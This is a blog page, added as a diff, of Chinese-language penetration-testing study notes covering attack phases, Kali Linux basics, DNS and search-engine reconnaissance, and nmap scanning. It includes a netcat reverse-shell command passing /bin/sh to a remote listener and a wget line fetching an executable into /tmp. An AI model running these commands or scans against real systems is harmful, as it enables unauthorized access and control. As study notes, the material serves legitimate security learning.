@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <title>安全笔记概论</title>
+  <meta name="description" content="1 概论">
+  <meta name="author" content="leopardpan">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="安全笔记概论">
+  <meta name="twitter:description" content="1 概论">
+
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="安全笔记概论">
+  <meta property="og:description" content="1 概论">
+
+  <link rel="icon" type="image/png" href="images/favicon.png" />
+  <link href="/images/favicon.png" rel="shortcut icon" type="image/png">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <!-- <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet"> -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
+
+  <link rel="canonical" href="http://C0ldstudy.github.io/2017/10/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">
+  <link rel="alternate" type="application/rss+xml" title="Jason Xu" href="http://C0ldstudy.github.io/feed.xml">
+
+  <!-- kramdown-math-katex latex sytax for markdown -->
+  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous"> -->
+  <!-- <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.js" integrity="sha384-9Nhn55MVVN0/4OFx7EE5kpFBPsEMZxKTCnA+4fqDmg12eCTqGi6+BB2LjY8brQxJ" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script> -->
+
+
+<!-- 站点统计 -->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<!-- google 统计 -->
+   
+  <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      ga('create', 'UA-118980599-1', 'auto');
+      ga('send', 'pageview');
+  </script>
+  
+
+</head>
+
+  <body>
+    <span class="mobile btn-mobile-menu">
+      <div class="nav_container">
+         <nav class="nav-menu-item" style = "float:right">
+            <i class="nav-menu-item">
+              <a href="/#blog" title="" class="blog-button">
+                Homepage
+              </a>
+            </i>
+            
+                <i class="nav-menu-item">
+                  <a href="/timeline" title="timeline" class="btn-mobile-menu__icon">
+                      Timeline
+                  </a>
+                </i>
+            
+                <i class="nav-menu-item">
+                  <a href="/tags" title="tags" class="btn-mobile-menu__icon">
+                      Tag
+                  </a>
+                </i>
+            
+                <i class="nav-menu-item">
+                  <a href="/photography" title="photography" class="btn-mobile-menu__icon">
+                      Photography
+                  </a>
+                </i>
+            
+                <i class="nav-menu-item">
+                  <a href="/about" title="about" class="btn-mobile-menu__icon">
+                      About me
+                  </a>
+                </i>
+            
+          </nav>
+      </div>
+    </span>
+
+
+
+
+    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/images/background-cover.jpg')">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+        <!-- 头像效果-start -->
+        <div class="ih-item circle effect right_to_left">
+            <a href="/#blog" title="前往 Jason Xu 的主页" class="blog-button">
+                <div class="img"><img src="/images/avatar.jpg" alt="img"></div>
+                <div class="info">
+                    <div class="info-back">
+                        <h2>
+                            
+                                C0ldstudy
+                            
+                        </h2>
+                        <p>
+                           
+                                Machine Learning / Security
+                            
+                        </p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <!-- 头像效果-end -->
+        <h1 class="panel-cover__title panel-title"><a href="/#blog" title="link to homepage for Jason Xu" class="blog-button">Jason Xu</a></h1>
+        
+        <span class="panel-cover__subtitle panel-subtitle">Personal Station</span>
+        
+        <hr class="panel-cover__divider" />
+        <p class="panel-cover__description">In the end, we only regret the chances we didn't take.</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+        <p class="panel-cover__description">🇨🇳Shanghai -> 🇭🇰Hong Kong -> 🇺🇸Irvine</p>
+        
+
+
+        <div class="navigation-wrapper">
+          <div>
+            <nav class="cover-navigation cover-navigation--primary">
+              <ul class="navigation">
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">Homepage</a></li>
+                
+                  <li class="navigation__item"><a href="/timeline" title="timeline">Timeline</a></li>
+                
+                  <li class="navigation__item"><a href="/tags" title="tags">Tag</a></li>
+                
+                  <li class="navigation__item"><a href="/photography" title="photography">Photography</a></li>
+                
+                  <li class="navigation__item"><a href="/about" title="about">About me</a></li>
+                
+              </ul>
+            </nav>
+          </div>
+        </div>
+
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="panel-cover--overlay cover-clear"></div>
+    
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner">
+            
+
+
+<article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 class="post-title">安全笔记概论</h1>
+    <div class="post-meta">
+      <img src="/images/calendar.png" width="20px"/>
+      <time datetime="2017-10-27 00:00:00 -0700" itemprop="datePublished" class="post-meta__date date">2017-10-27 | </time>
+      <span id="busuanzi_container_page_pv" style='display:none'> Read: <span id="busuanzi_value_page_pv"></span> Times</span>
+
+    </div>
+  </header>
+
+  <section class="post">
+
+    <h3 id="1-概论">1 概论</h3>
+
+<ul>
+  <li>攻击流程
+    <ul>
+      <li>预攻击：收集信息，进行决策</li>
+      <li>攻击：进行攻击，获得权限，进行渗透</li>
+      <li>后攻击：长期控守，维持权限，消除痕迹</li>
+    </ul>
+  </li>
+  <li>APT攻击（高级持续性攻击）
+    <ul>
+      <li>定向信息收集：针对性收集，包括网络隐蔽扫描和社工方法</li>
+      <li>外网攻击突破：恶意代码攻击个人终端或者单位服务器</li>
+      <li>构建控制通道：采用HTTP、HTTPS、DNS等协议，绕过安全防护设备</li>
+      <li>内部横向渗透：以终端主机和DMZ区，在系统内部多层渗透，攻击更多服务器获得更多权限。</li>
+      <li>数据收集上传</li>
+      <li>攻击痕迹清理</li>
+    </ul>
+  </li>
+  <li>知识框架
+    <ul>
+      <li>信息收集</li>
+      <li>突防攻击</li>
+      <li>隐蔽控守</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="2-kali-linux基础">2. Kali Linux基础</h3>
+
+<h5 id="21-linux分支">2.1 linux分支</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* RedHat
+	* CentOS
+	*  RedHat
+* Debian
+	* Ubuntu 
+	* Linxu
+* Slackware
+* 查看内核版本号
+	* uname -a
+	* cat /proc/version cat /etc/issue
+	* cat /etc/os-release 
+</code></pre></div></div>
+
+<h5 id="22-kali基础介绍">2.2 Kali基础介绍</h5>
+
+<ul>
+  <li>Linux文件目录结构
+    <ul>
+      <li>etc 配置目录</li>
+      <li>bin 用户自带的可执行文件 or /usr/bin</li>
+      <li>boot 引导</li>
+      <li>media 虚拟机共享目录</li>
+      <li>mnt 	U盘加载目录</li>
+      <li>proc 查看进程信息</li>
+      <li>sbin	系统自带的可执行文件（system）</li>
+      <li>tmp 临时目录（重启全部清空，所有用户都能读写）</li>
+      <li>usr 用户安装软件 工具在/usr/share路径下</li>
+    </ul>
+  </li>
+  <li>Kali基本操作
+    <ul>
+      <li>ifconfig
+        <ul>
+          <li>lo：本地回环127.0.0.1</li>
+        </ul>
+      </li>
+      <li>ln创建链接
+        <ul>
+          <li>硬链接：文件的两个副本</li>
+          <li>符号链接：快捷方式 ln -s 源文件 链接文件</li>
+        </ul>
+      </li>
+      <li>more：按页显示文件</li>
+      <li>less：按页显示文件，可以翻页</li>
+      <li>head -n file：显示文件前n行</li>
+      <li>tail -n file：显示文件后n行</li>
+      <li>umask 设置文件权限屏蔽位，取反即是新建文件默认权限</li>
+      <li>chown user file 修改文件所有者</li>
+      <li>chgrp 修改文件所有组</li>
+      <li>
+        <p>对应后缀的文件加密</p>
+
+        <table>
+          <thead>
+            <tr>
+              <th>命令</th>
+              <th>文件后缀</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>gzip,gunzip</td>
+              <td>.gz</td>
+            </tr>
+            <tr>
+              <td>zip,unzip</td>
+              <td>.zip</td>
+            </tr>
+            <tr>
+              <td>tar</td>
+              <td>.tar</td>
+            </tr>
+            <tr>
+              <td>compress,bzip2</td>
+              <td>.bz2</td>
+            </tr>
+          </tbody>
+        </table>
+      </li>
+      <li>磁盘管理命令
+        <ul>
+          <li>du 显示文件和目录空间占用情况</li>
+          <li>df 显示磁盘文件系统的相关信息</li>
+          <li>mount/umount 安装/卸载文件系统</li>
+        </ul>
+      </li>
+      <li>用户管理
+        <ul>
+          <li>id 显示当前用户信息</li>
+          <li>adduser 增加用户</li>
+          <li>passwd 	更改用户密码</li>
+          <li>userdel	删除用户</li>
+          <li>traceroute 测试和远程主机的路由情况</li>
+          <li>ps 显示进程及状态</li>
+          <li>kill [进程id]杀死进程</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>netstat -t	//只看tcp连接
+    <ul>
+      <li>netstat -nt //不将IP地址反向解析为主机名或域名</li>
+      <li>netstat -ant	//本机监听连接（all）</li>
+      <li>netstat -antp  //process与进程关联起来</li>
+      <li>windows： netstat -an -p tcp</li>
+      <li><code class="language-plaintext highlighter-rouge">ps -aux | grep 2120</code> //打印所有进程，匹配2120进程</li>
+      <li>postgresql 5432端口</li>
+    </ul>
+  </li>
+  <li>网卡配置(配置静态IP地址)：
+    <ul>
+      <li>修改网卡配置/etc/network/interfaces
+        <ul>
+          <li>auto eth0</li>
+          <li>iface eth0 inet static</li>
+          <li>address 192.168.80.30</li>
+          <li>netmask</li>
+          <li>geteway</li>
+        </ul>
+      </li>
+      <li>修改域名服务器地址 /etc/resolv.conf</li>
+      <li>重启网络: /etc/init.d/networking restart or reboot</li>
+    </ul>
+  </li>
+  <li>Kali 服务管理
+    <ul>
+      <li>Web服务器根目录 /var/www/html/</li>
+      <li>apache2/postgresql</li>
+      <li>配置服务自启动：update-rc.d postgresql enable</li>
+    </ul>
+  </li>
+  <li>
+    <p>替换更新源为国内源/etc/apt/sources.list</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  中科大kali源
+  deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
+  deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
+  阿里云kali源
+  deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+  deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib    * advanced package tool(apt)   * apt-get update/upgrade 	//下载更新列表/更新对应软件   * apt-get dist-upgrade		//下载对应依赖包   * apt-get clean				//清除冗余文件
+</code></pre></div>    </div>
+  </li>
+  <li>Vmware Tools(滚动更新版)
+    <ul>
+      <li>apt -y install open-vm-tools-desktop fuse</li>
+      <li>reboot</li>
+    </ul>
+  </li>
+  <li>安装VPN
+    <ul>
+      <li>安装openvpn</li>
+    </ul>
+  </li>
+</ul>
+
+<h5 id="23-kali-进阶使用">2.3 Kali 进阶使用</h5>
+
+<ul>
+  <li>环境变量
+    <ul>
+      <li>env
+        <ul>
+          <li><code class="language-plaintext highlighter-rouge">env | grep -i path</code> //-i忽略大小写</li>
+          <li>echo $PATH</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>搜索
+    <ul>
+      <li>whereis/which ifconfig //在$PATH和$MANPATH能找到ifconfig/在$PATH</li>
+      <li>locate 在updatedb数据库中匹配字符串</li>
+      <li>find /（指定目录） -type f（文件）、d（目录） -name（指定名称）</li>
+    </ul>
+  </li>
+  <li>netcat 瑞士军刀
+    <ul>
+      <li>nc -nlp <port> -vv 监听端口
+</port>        <ul>
+          <li>nc -p 443 指定端口号监听443端口</li>
+          <li>nc -l 监听（服务端）</li>
+          <li>nc -n 不解析域名</li>
+          <li>nc -vv 详细信息</li>
+          <li>实现服务器端获得客户端的shell
+            <ul>
+              <li>nc -lnp &lt;（服务器端）ip&gt; <port>  //服务器监听开启</port></li>
+              <li>nc &lt;（服务器）ip&gt; <port> -e（执行程序） /bin/sh  //客户端把shell传递给服务器，就可以在服务器上输入指令控制客户端</port></li>
+              <li>/bin/sh linux类似于Windows的cmd接口程序</li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>kali服务器客户端
+    <ul>
+      <li>python轻量级web服务器
+        <ul>
+          <li>python -m SimpleHTTPServer 80</li>
+        </ul>
+      </li>
+      <li>wget <ip> -O /tmp/1.exe		//-O实现在指定目录下保存</ip></li>
+    </ul>
+  </li>
+  <li>软件工具的安装
+    <ul>
+      <li>apt
+        <ul>
+          <li>apt-cache search/show packagename 搜索包</li>
+          <li>apt-get install packagename –reinstall 安装/重新安装</li>
+          <li>apt-get remove packagename 删除包</li>
+          <li>apt-get autoclean 清理无用包</li>
+          <li>apt-get check 检查是否有损害</li>
+        </ul>
+      </li>
+      <li>dpkg
+        <ul>
+          <li>dbkg -i package-deb</li>
+        </ul>
+      </li>
+      <li>git</li>
+      <li>下载源代码压缩包
+        <ul>
+          <li>wget <ip>(tgz)</ip></li>
+          <li>tar -xzvf archive.tar.gz</li>
+          <li>./configure</li>
+          <li>make</li>
+          <li>make install</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="3-信息收集">3. 信息收集</h3>
+<h5 id="31-网络信息收集">3.1 网络信息收集</h5>
+
+<ul>
+  <li>网络信息收集
+    <ul>
+      <li>whois数据库：查询Internet注册信息的标准协议、域名提供商、域名服务器
+        <ul>
+          <li>whois <ip></ip></li>
+        </ul>
+      </li>
+      <li>域名查询：查询DNS服务器
+        <ul>
+          <li>nslookup
+            <ul>
+              <li>baidu.com</li>
+              <li>set type=ns/A/mx</li>
+              <li>server ns1.cnhubei.com</li>
+              <li>ls cnhubei.com</li>
+            </ul>
+          </li>
+          <li>host -t mx baidu.com
+            <ul>
+              <li>host -l sda.gov.cn ns.sda.gov.cn //发请求到域名服务器要求列出子域名</li>
+            </ul>
+          </li>
+          <li>dig命令
+            <ul>
+              <li>dig ns sda.gov.cn</li>
+              <li>dig axfr</li>
+            </ul>
+          </li>
+          <li>dnsenum –enum sda.gov.cn</li>
+          <li>fierce:域名猜测
+            <ul>
+              <li>fierce -dns 163.com -wordlist dns-names.txt -threads 50 //同时起50个线程根据提供的字典猜测子域名</li>
+              <li>自带字典位置：/usr/share/fierce/hosts.txt</li>
+              <li><code class="language-plaintext highlighter-rouge">cat 163.com.dns.txt | awk -F'/t' '{printf"%s\t%s\n",$2,$1}' | sort</code> //按照需求分割</li>
+              <li>awk文本处理工具 -F分割域</li>
+              <li>windows使用layer子域名查询机</li>
+            </ul>
+          </li>
+          <li>DNS域传送泄露（域名遍历）漏洞：DNS服务器不加确认就向对方提供域名数据库备份</li>
+        </ul>
+      </li>
+      <li>基于搜索引擎的信息探测
+        <ul>
+          <li>google/baidu
+            <ul>
+              <li>site:sjtu.edu.cn根据域名搜索</li>
+              <li>filetype:php 搜索PHP界面</li>
+              <li>inurl:login		url中包括哪些关键词</li>
+              <li>intitile：		//在网页标题中包含的</li>
+              <li>intext：			//在内容中包含的</li>
+              <li>link</li>
+            </ul>
+          </li>
+          <li>Google Hacking Database 黑客搜索语句的数据库
+            <ul>
+              <li>基于GHDB的SiteDigger</li>
+            </ul>
+          </li>
+          <li>theharvester -d hrw.org -b all //搜索邮件</li>
+          <li>maltego互联网情报收集平台，社工工具
+            <ul>
+              <li>maltegoce</li>
+              <li>输入目标域名：Infrastructure -&gt;拖拽domain节点</li>
+            </ul>
+          </li>
+          <li>recon-ng
+            <ul>
+              <li>use recon/domains-hosts/bing_domain_web</li>
+              <li>set source sjtu.edu.cn</li>
+              <li>数据库位置 /.recon-ng/workspaces/default</li>
+              <li>用火狐打开firefox resutl.html</li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>主机信息收集
+    <ul>
+      <li>主机端口及服务
+        <ul>
+          <li>Netbios文件共享服务 端口号135-139,445(windows专有)</li>
+        </ul>
+      </li>
+      <li>端口扫描
+        <ul>
+          <li>常规扫描，三次握手。调用socket库中connect函数
+            <ul>
+              <li>Nmap扫描器
+                <ul>
+                  <li>TCP SYN扫描
+                    <ul>
+                      <li>扫描结果分为三种
+                        <ul>
+                          <li>open		开放的端口</li>
+                          <li>reset	不提供服务的端口</li>
+                          <li>close	防火墙过滤</li>
+                        </ul>
+                      </li>
+                    </ul>
+                  </li>
+                  <li>TCP FIN扫描（误报很多）
+                    <ul>
+                      <li>没有回应	开放端口</li>
+                      <li>RST重置	不提供服务的端口</li>
+                    </ul>
+                  </li>
+                  <li>使用libpcap</li>
+                  <li>-Pn 认定所有主机在线，跳过主机发现</li>
+                  <li>nmap -sP <ip></ip></li>
+                  <li>nmap -sT 172.16.1.1-254 -p 139,445 -Pn –open		//-Pn不ping对方</li>
+                  <li>nmap 脚本位置： /usr/share/nmap/scripts</li>
+                  <li>nmap脚本类型 <strong><em>看一遍</em></strong>
+                    <ul>
+                      <li>auth: 负责处理认证证书(绕开认证)的脚本;</li>
+                      <li>broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务;</li>
+                      <li>brute: 提供暴力破解方式，针对常见的应用如http/snmp等;</li>
+                      <li>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力;</li>
+                      <li>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等;</li>
+                      <li>dos: 用于进行拒绝服务攻击;</li>
+                      <li>exploit: 利用已知的漏洞攻击系统;</li>
+                      <li>external: 利用第三方的数据库或资源，例如进行whois解析;</li>
+                      <li>fuzzer: 模糊测试，发送异常的包到目标机，探测潜在漏洞;</li>
+                      <li>intrusive: 带有入侵性，可能引发对方的IDS/IPS的记录或屏蔽;</li>
+                      <li>malware: 探测目标机是否感染了病毒、开启了后门等信息;</li>
+                      <li>safe: 与intrusive相反，属于安全性脚本;</li>
+                      <li>version: 增强服务与版本扫描(Version Detection)功能;</li>
+                      <li>vuln: 检查目标机是否有常见的漏洞(Vulnerability)，如MS08_067、MS17_010等。</li>
+                      <li>smb-vuln-ms17-010.nse  //永恒之蓝漏洞检测脚本</li>
+                    </ul>
+                  </li>
+                  <li>nmap常规用法
+                    <ul>
+                      <li>nmap -sT(常规三次握手协议) -sS(SYN扫描) -Pn（扫描时不去ping对方）</li>
+                      <li>nmap –script=default -Pn <ip地址></ip地址></li>
+                      <li>nmap –script=smb-vuln* -Pn <ip地址></ip地址></li>
+                      <li>nmap -A -Pn 192.168.80.201  //综合性扫描-A</li>
+                      <li>nmap -sS -Pn -p 21-23,25,80,110,135- 139,143,443,445,1433,1521,3306,3389,5556,5631,5900,8080 192.168.80.1-254 –open   //扫描特定端口</li>
+                    </ul>
+                  </li>
+                  <li>nmap图形化前端Zenmap</li>
+                </ul>
+              </li>
+              <li>nc 172.16.1.201 80
+                <ul>
+                  <li>
+                    <p>HEAD只回应头部数据，扫描时使用，可以得到旗标信息banner</p>
+
+                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  方法1：
+  HEAD / HTTP/1.1
+  HOST:172.16.1.201
+  方法2：
+  GET /HTTP/1.1
+  HOST:172.16.1.201
+</code></pre></div>                    </div>
+                  </li>
+                  <li>nginx 顺序上服务器信息在前，日期在后</li>
+                  <li>apache 与nginx相反，日期信息在前，服务器信息在后</li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li>
+        <p>主机操作系统的探测
+   	* nmap-os-db操作系统指纹数据库不断更新
+   	* nmap -sS 172.16.1.201 -Pn -p 139,445,80 -O  //-O操作系统·
+   	* -sT（发送ACK包） -sS（发送SYN包） -sV（根据开放端口获取系统信息） -Pn -p -O（搜索操作系统）</p>
+      </li>
+      <li>漏洞扫描
+        <ul>
+          <li>CVE(Common Vulnerability Exposures)通用漏洞披露库: 设置漏洞编号</li>
+          <li>NVD(National Vulnerability Database): 多个CVE安全漏洞详细信息</li>
+          <li>Nessus: 综合性漏洞探测 <strong><em>（注册一波）</em></strong>
+            <ul>
+              <li>扫描策略</li>
+              <li>扫描目标</li>
+              <li>扫描结果</li>
+            </ul>
+          </li>
+          <li>OpenVas kali自带，不好用</li>
+        </ul>
+      </li>
+      <li>Web漏洞探测
+        <ul>
+          <li>w3af: Web Application Attack Framework</li>
+          <li>nikto</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>局域网信息搜索
+    <ul>
+      <li>主机发现
+        <ul>
+          <li>ICMP协议<strong><em>研究一波</em></strong>（存在ICMP广播风暴，使用已经过时）
+            <ul>
+              <li>8字节，1个自己type，1个字节code</li>
+              <li>echo request 8 0</li>
+              <li>echo reply 0 0</li>
+            </ul>
+          </li>
+          <li>ARP，Address Resolution Protocol(链路层)：寻找哪个IP地址对应的Mac地址为目的地址，对应发送数据包
+            <ul>
+              <li>ARP协议解析过程<strong><em>研究一波</em></strong></li>
+              <li>IPv4(网络层)</li>
+              <li>数据包寻址通过Mac地址</li>
+              <li>ARP命令
+                <ul>
+                  <li>-a</li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li>NetDiscover找局域网中存货主机</li>
+    </ul>
+  </li>
+</ul>
+
+  </section>
+<!-- <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script> -->
+</article>
+
+<section>
+       <ul class="pager">
+        
+        <li class="previous">
+            <a href="/2017/09/%E9%98%BF%E9%87%8C%E4%BA%91ubuntu%E9%85%8D%E7%BD%AEFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/" data-toggle="tooltip" data-placement="top" title="阿里云ubuntu配置FTP服务器">Last Blog：  <span>阿里云ubuntu配置FTP服务器</span>
+            </a>
+        </li>
+        
+        
+        <li class="next">
+            <a href="/2017/11/MongoDB/" data-toggle="tooltip" data-placement="top" title="MongoDB自学笔记">Next Blog：  <span>MongoDB自学笔记</span>
+            </a>
+        </li>
+        
+    </ul>
+</section>
+
+<section class="post-comments">
+<div id="disqus_thread"></div>
+  <script type="text/javascript">
+    var disqus_config = function () {
+      // Here is an example,
+      this.page.url = "https://c0ldstudy.github.io/2017/10/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/";
+      this.page.identifier = "/2017/10/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/";
+    };
+
+    // You should be able to get the following lines of code from your Disqus admin.
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = '//c0ldstudy-github-io.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript>
+    Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+  </noscript>
+</section>
+
+
+            <section class="footer">
+    <footer>
+        <div class = "footer_div">
+          <div clas="recordings" style="display:flex;justify-content:space-around;">
+          <div class="twitter_display">
+            <div class='jekyll-twitter-plugin'><a class="twitter-timeline" data-width="300" data-tweet-limit="1" href="https://twitter.com/JiacenXu?ref_src=twsrc%5Etfw">Tweets by JiacenXu</a>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+</div>
+          </div>
+          <div class="github_chart">
+            <img src="http://ghchart.rshah.org/409ba5/C0ldstudy" alt="C0ldstudy's Blue Github chart"/>
+            <script type='text/javascript' id='clustrmaps' src='//cdn.clustrmaps.com/map_v2.js?cl=ffffff&w=400&t=n&d=PWaejm3rz2TG6HOtwcekX2kM9kPWz2aP6GYhuOVoNpA&co=2d78ad&cmo=3acc3a&cmn=ff5353&ct=ffffff'></script>
+          </div>
+        </div>
+            <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+          
+          <!-- Github -->
+          <li class="navigation__item_social">
+            <a href="https://github.com/c0ldstudy" title="@c0ldstudy 的 Github" target="_blank">
+              <i class='fab fa-github fa-2x'></i>
+              <span class="label">Github</span>
+            </a>
+          </li>
+          
+          
+          <!-- Twitter -->
+          <li class="navigation__item_social">
+            <a href="https://twitter.com/JiacenXu" title="@JiacenXu" target="_blank">
+              <i class='fab fa-twitter fa-2x'></i>
+              <span class="label">Twitter</span>
+            </a>
+          </li>
+          
+
+          
+          <!-- LinkedIn -->
+          <li class="navigation__item_social">
+            <a href="https://www.linkedin.com/in/jiacen-xu-021536105/" title="@jiacen-xu-021536105" target="_blank">
+              <i class='fab fa-linkedin fa-2x'></i>
+              <span class="label">LinkedIn</span>
+            </a>
+          </li>
+          
+          
+
+          <!-- RSS -->
+          <li class="navigation__item_social">
+            <a href="/feed.xml" rel="author" title="RSS" target="_blank">
+              <i class='fa fa-rss fa-2x'></i>
+              <span class="label">RSS</span>
+            </a>
+          </li>
+
+          
+          <!-- Email -->
+          <li class="navigation__item_social">
+            <a href="mailto:coldstudyxu@gmail.com" title="Contact me">
+              <i class='fa fa-envelope fa-2x'></i>
+              <span class="label">Email</span>
+            </a>
+          </li>
+          
+          </ul>
+        </nav>
+        </div>
+
+        <div class = "footer_div_counter">
+           <p class="copyright text-muted">
+            Copyright &copy; Jason Xu 2022 Theme by <a href="http://c0ldstudy.github.io/">C0ldstudy</a> |
+            <iframe
+                style="margin-left: 2px; margin-bottom:-5px;"
+                frameborder="0" scrolling="0" width="91px" height="20px"
+                src="https://ghbtns.com/github-btn.html?user=c0ldstudy&repo=c0ldstudy.github.io&type=star&count=true" >
+            </iframe>
+            </p>
+        	<div align="right">
+    			<!-- <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css"> -->
+          <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
+
+          <!-- 访问统计 -->
+          <span id="busuanzi_container_site_uv" style='display:none'>
+          <span id="busuanzi_value_site_uv"></span> People Visited!
+          </span>
+        </div>
+        </div>
+    </footer>
+</section>
+
+        </div>
+    </div>
+
+    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript" src="/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  </body>
+
+</html>
